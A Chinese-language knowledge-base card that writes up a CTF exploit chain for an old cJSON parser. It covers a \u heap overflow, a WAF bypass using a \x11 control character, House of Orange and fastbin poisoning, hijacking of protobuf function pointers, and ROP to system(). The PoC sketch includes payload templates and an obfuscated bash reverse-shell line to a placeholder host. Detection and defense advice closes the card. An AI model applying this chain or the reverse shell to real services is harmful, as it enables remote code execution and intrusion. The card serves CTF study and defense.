---
id: binary-pwn-heap-cjson-unicode-overflow-house-of-orange-fastbin-protobuf-rop
title: cJSON \u 堆溢出全链：数组喷堆绕过 WAF + House of Orange 造 fastbin，改 protobuf 数据段函数指针 ROP
type: scenario
domain: binary
path: binary/pwn/heap
technique: cjson-unicode-overflow-array-spray-house-of-orange-protobuf-rop
tags:
- pwn
- heap
- cjson
- json-parser
- heap-overflow
- house-of-orange
- fastbin
- waf-bypass
- protobuf
- rop
- ctf
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-12'
updated: '2026-11-12'
verification:
  verified_by: verifier-V574
  verified_at: '2026-11-12T11:01:28+08:00'
  notes: 已对照12916原文(中英双语726行)与全部4图核对，无读取失败：图01数组节点喷堆缩小top、图02申请大块释放旧top(House of Orange)、图03再次构造第二个free chunk、图04溢出第一个free chunk改第二个fd构造fastbin attack，与卡片原理/步骤一致。原文parse_string代码确认\u后ptr+=4越过长度计算所见的引号导致溢出；WAF用PCRE2\s与cJSON skip(≤0x20)差异绕过数组正则(script用\x11)；完整pwntools脚本含两次House of Orange(size 0x1041→0x41、0x21f81→0xb1)、fastbin fake fd 0x67601a、protobuf data段.alloc/.free函数指针pivot、mov rax,[rdi+0x28]取getenv加system-getenv偏移、ROP call rax执行命令，卡片技术点/PoC与之一致。原文只写较早版本cJSON、未给版本区间，affected_versions空缺正确。dedup：首位为卡片自身；与binary-pwn-heap-cjson-parse-string-unicode-escape-unbounded-overflow同sink但该卡仅溢出原语(confidence medium、未打通RCE)，新卡为Real World CTF Corrupted GI完整CGI+WAF+Full RELRO+protobuf RCE链；与house-of-orange系列打GOT/hook的卡目标与环境不同，非同链，库内无同题卡。frontmatter无sources与既有卡规范一致；内部wiki链接均存在。PoC未复跑。
url: /docs/binary/pwn/heap/binary-pwn-heap-cjson-unicode-overflow-house-of-orange-fastbin-protobuf-rop/
draft: false
kb_aliases:
- Real World CTF Corrupted GI
- cJSON 堆溢出 RCE
- 数组喷堆绕过 WAF
- House of Orange 双 free chunk
- fastbin attack 数据段函数指针
- protobuf 函数指针劫持
---

## 一句话结论

在解析攻击者可控 JSON 的旧版 cJSON 服务里，`\u` 转义的长度/写入不一致可造成受控堆溢出；即使解析过程没有 free、WAF 限制 payload 长度且开启 Full RELRO，仍可用「数组短 payload 喷堆」把 top chunk 缩小，借 House of Orange 连续造出两个 free chunk，再用溢出改写第二个 chunk 的 fd 做 fastbin attack 分配到 protobuf 留在 data 段的函数指针表，劫持 `.alloc/.free` 指针 pivot 到 ROP，最终 `system()` 执行命令。

## 原理

- **溢出根因**：旧版 `parse_string` 先按 `while (*ptr!='"' && *ptr && ++len) if (*ptr++=='\\') ptr++;` 计算长度，再按另一套指针推进写入；遇到 `\u` 时写入循环 `sscanf(ptr+1,"%4x",&uc); ... ptr+=4;` 一次跳过 4 字节。若 `\u` 后面 4 字节中正好包含第一步用来结束长度计算的引号，写入循环会越过该引号继续写，分配 `len+1` 与实际写入量不一致，形成长度和内容都可控的堆溢出。
- **为什么解析期没有 free**：cJSON 解析 JSON 时逐节点 `cJSON_malloc`，正常路径不在解析中释放；要利用堆必须先制造 free chunk，因此引入 House of Orange：用溢出把 top chunk 的 size 改小，再申请一个大于它的块，`sysmalloc` 会释放旧 top 并建立新 top，从而在没有程序 free 的情况下得到空闲块。
- **短 payload 喷大量堆**：JSON 数组 `[1,1,1,...]` 的每个元素都会新建一个 cJSON 节点（约 0x50 的 chunk），而文本只需 `1,` 两个字节，故可用很短的输入申请大量堆内存，把 top chunk 压到足够小，为后续「申请大块触发旧 top 释放」做准备。
- **WAF 解析差异绕过**：WAF 用 PCRE2 正则 `"\s*:\s*\[` 拦截数组。cJSON 自己的 `skip()` 会跳过所有 `<=0x20` 的字节，而 PCRE2 的 `\s` 只匹配常见空白（空格、`\n`、`\r`、`\t` 等），不匹配 `\x01`~`\x1f` 中的控制字符。因此在 `:` 与 `[` 之间插入一个 `\x11`，WAF 正则失配，cJSON 仍把它当空白跳过并正常解析数组，例如 `"timestamp":\x11[1,1,...]`。
- **两次 House of Orange 造两个 free chunk**：先喷堆缩小 top，再申请大块让旧 top 被释放；随后用溢出把新 top 的 size 改成更小值（如 `0xb1`），再次申请超过该 size 的块释放第二个旧 top。这样堆上同时存在两个可控的空闲 chunk。
- **溢出进 fd 做 fastbin attack**：申请第一个 free chunk 后，用 `\u` 溢出写它相邻的第二个 free chunk 的 `fd`，指向目标地址（data 段中一个 0x41 大小的伪 chunk 位置）。之后连续 `malloc` 两次即可从 fastbin 取到伪造地址，实现对目标内存的写。
- **为什么打 data 段函数指针而不是 GOT**：程序开启 Full RELRO，GOT 只读；但 protobuf 在 data 段保存了 `.alloc/.free` 等函数指针，fastbin attack 分配到该表后可以改写这些指针。`free` 路径中的 `call [rbx+8]` 等间接调用被导入 pivot gadget（如 `xchg eax, esp; ...`），把栈迁到可控堆数据上，再执行 ROP。
- **ROP 计算 system**：先以 `mov rax,[rdi+0x28]` 配合 `rdi = getenv@got - 0x28` 取到 `getenv` 地址，再 `add rax, rsi`（`rsi = system - getenv` 的固定偏移）得到 `system`，最后 `pop rdi` 指向命令串并 `call rax`，完成命令执行。

## 触发条件

- 服务使用旧版 cJSON（`parse_string` 长度与写入指针推进不一致的版本）解析攻击者可控 JSON，且溢出内容可越过字符串 chunk 影响到相邻 top/free chunk。
- 解析路径没有可控 free，需依赖 House of Orange 制造空闲块。
- 输入经过 WAF/长度限制，但 WAF 的空白匹配规则与 cJSON `skip()` 的 `<=0x20` 规则存在差异，可用控制字符绕过数组过滤。
- 程序开启 Full RELRO 时，需存在可写的 data 段函数指针（如 protobuf 的 `.alloc/.free`）作为劫持目标；无此类指针时该链难以落地。
- 目标 glibc 的 top chunk 校验/`sysmalloc` 行为允许 House of Orange（较老 glibc；原文未标注具体版本）。

## 利用步骤

1. **喷堆缩小 top**：构造 `"k":\x11[1,1,1,...]`，用 `1,` 重复 N 次申请大量 0x50 节点，把 top chunk 压到接近所需阈值。
2. **第一次 House of Orange**：构造 `"aaaa...\u"   ` 溢出，把旧 top 的 `prev_size` 与 `size` 改为小值（如 `0x1041 → 0x41`），随后申请一个大于该 size 的块，让 `sysmalloc` 释放旧 top。
3. **第二次 House of Orange**：再次溢出新 top 的 size（如改成 `0xb1`），申请超过它的块释放第二个 free chunk，得到两个相邻空闲块。
4. **fastbin 投毒**：申请第一个 free chunk，再用 `\u` 溢出把第二个 free chunk 的 `fd` 写成 data 段伪 chunk 地址（0x41 大小对齐位置）。
5. **分配伪 chunk**：执行若干 `malloc`（一次 dummy + 一次目标），让 fastbin 返回伪地址，覆写 protobuf 的 `.alloc/.free` 函数指针表。
6. **pivot 到 ROP**：把 `.alloc` 改为形如 `test rsi,rsi; jz ...; mov rdi,[rbx+0x10]; call [rbx+8]` 的 gadget 附近地址以跳过条件分支，把 `.free` 改为 `xchg eax, esp; ...; ret` 一类栈迁移 gadget，堆上布局命令串与 ROP 链。
7. **ROP 取 system 并执行**：`rdi = getenv@got - 0x28`、`rax = [rdi+0x28]` 取 `getenv`，`add rax, (system - getenv)`，`pop rdi` 指向命令串，`call rax`。

## PoC

```python
# 核心 payload 结构（占位，实际偏移依赖目标二进制）
# 1) 数组喷堆 + WAF 解析差异：':' 与 '[' 之间放 \x11（cJSON skip 跳过，PCRE2 \s 不匹配）
json_tpl = b'{"data":"...","timestamp":61866,"timestamp":\x11[%b]}'

# 2) 溢出旧 top：prev_size 填充 + 把 size 0x1041 改为 0x41
overflow_old_top = b'"aaaaaaaaaaaaa\\u"   ' + b'0'*8 + p16(0x41) + b'",'

# 3) 溢出新 top：把 size 改成 0xb1，制造第二个 free chunk
overflow_new_top = b'"bbbb...\\u"   ' + b'1'*8 + p8(0x61+0x50) + p16(0) + b'",'

# 4) 在第二个 free chunk 的 fd 写 data 段伪 chunk 地址（示意）
overflow_fastbin_fd = b'"cccc...\\u"   ' + b'3'*(0x1100-8) + p64(0x41) + p32(<fake_fd_addr>) + b'",'

# 5) pivot：覆写 protobuf 函数指针表（.alloc/.free/getenv@got-0x28/命令串/ROP）
#    0x00 -> alloc gadget：test rsi,rsi; jz ...; mov rdi,[rbx+0x10]; call [rbx+8]
#    0x08 -> free gadget：xchg eax, esp; ...; ret（栈迁移到堆）
#    0x10 -> getenv@got - 0x28
#    0x18 -> b"bas'h' -i >& /dev/'t'cp/<ip>/<port> 0>&1;"
#    0x118 -> ROP: mov rax,[rdi+0x28]; pop rsi; system-getenv; add rax,rsi; pop rdi; cmd; call rax
```

说明：原文提供了完整可用的 pwntools 脚本（数组喷堆、两次 House of Orange、fastbin fake fd、protobuf 函数指针 pivot、getenv 相对偏移求 system），本题为 cJSON 解析入口的 CGI；本库未复跑，偏移与 gadget 依目标二进制而定。

## 变体与关联

- 变体：WAF 只过滤 `"\s*:\s*\[` 时，除 `\x01`~`\x1f` 外还可用 `\x00`（若输入层允许）等 cJSON `skip()` 接受而正则不匹配的字节。
- 变体：目标无 protobuf 数据段函数指针且 Full RELRO 时，可改打可写全局结构（如解析树节点、业务回调表）或先泄 libc 再走 `__free_hook/__malloc_hook`（glibc 较新版本无 hook）。
- 变体：仅能溢出少量字节时，可只改 top size 低字节做相对利用，配合堆风水减少绝对地址依赖。
- 关联：[[binary-pwn-heap-cjson-parse-string-unicode-escape-unbounded-overflow]]（同一漏洞的原始溢出原语与最小复现，本卡补齐完整 RCE 链）、[[binary-pwn-heap-house-of-orange-fastbin-got-onegadget]]（无 free 的 House of Orange + fastbin 打 GOT）、[[binary-pwn-heap-house-of-orange-single-free-fastbin-malloc-hook-onegadget]]（House of Orange 泄 libc + hook）。
- 边界：新版 cJSON 修复了 `\u` 边界校验；WAF 若按字节白名单/规范化后再匹配则绕过失效；glibc 新版本对 top chunk/fastbin 加固会提高利用难度。

## 检测与防御

- 检测：JSON 中出现 `:` 与 `[` 之间夹 `0x01`~`0x1f` 控制字符；`\u` 后紧跟引号或非十六进制字符；同一请求包含超长 `1,` 数组或异常巨大堆分配；解析器进程堆 size 异常（`corrupted size vs. prev_size`、`malloc_printerr`）。
- 防御：升级 cJSON 到修复版本（`\u` 前校验 4/6 字节合法 hex、写入前做边界检查）；WAF 与解析器使用同一套空白/转义语义，先规范化再匹配，并对控制字符直接拒绝。
- 加固：开启 Full RELRO/ASLR/CANARY（本题已开仍被绕，需配合编译期保护与堆加固）；禁用不必要的 data 段函数指针；对不可信 JSON 使用隔离进程与长度/嵌套深度上限。
